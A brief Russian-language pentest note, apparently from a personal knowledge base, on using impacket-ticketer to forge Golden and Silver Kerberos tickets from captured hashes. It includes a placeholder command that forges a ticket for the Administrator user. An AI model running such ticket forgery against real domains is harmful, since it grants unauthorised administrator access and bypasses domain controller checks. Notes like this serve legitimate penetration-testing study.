#tool #windows #kerberos 

> `impacket-ticketer` — это инструмент для **создания Kerberos-билетов вручную** на основе перехваченных секретов

## Оглавление
- [[#Импакт]]
- [[#Как работает]]
- [[#Эксплуатация]]

---

## Импакт 

Позволяет создать билеты без взаимодействия с DC
- Golden 
- Silver 

## Как работает

Kerberos основан на симметричной криптографии.
DC и сервис знают общий секрет.
Если билет подписан правильным hash — сервис доверяет.
DC даже не участвует.
Ты обходишь DC полностью.

## Эксплуатация

```bash
impacket-ticketer \
-nthash <hash> \
-aesKey <aesKey> \
-domain <domain> \
-spn <SPN> \
-domain-sid <sid> \
-duration <duration> \
-user Administrator
```
